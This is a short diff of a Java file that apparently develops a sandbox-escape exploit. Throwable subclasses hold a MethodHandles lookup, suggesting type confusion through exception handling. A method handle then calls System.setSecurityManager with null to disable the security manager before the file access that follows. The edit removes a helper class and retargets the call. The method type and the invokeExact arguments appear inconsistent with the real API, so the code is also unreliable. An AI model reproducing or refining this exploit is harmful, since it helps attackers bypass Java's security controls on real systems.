@@ -6,15 +6,6 @@ import java.io.File;
 import java.io.IOException;
 
 public class Main {
-
-		public class Mirror{
-        		Class<?> lookupClass;
-        		int allowedModes;
-
-        		public void setSecurityNull() {
-                		System.setSecurityManager(null);
-		        }
-		}
         public static class BadCast1 extends Throwable{
                 Object o1 = MethodHandles.publicLookup();
         }
@@ -35,9 +26,9 @@ public class Main {
                 BadCast2 e = new BadCast2();
                 handleEx(e);
                 MethodType metType = MethodType.methodType(void.class, System.class);
-                MethodHandle metHandle = MethodHandles.lookup().findStatic(System.class, "setSecurityNull", metType);
+                MethodHandle metHandle = MethodHandles.lookup().findStatic(System.class, "setSecurityManager", metType);
              	metHandle.invokeExact(System.class, null);
-
+             	
                 try {
        			File file = new File("myfile.txt");
 
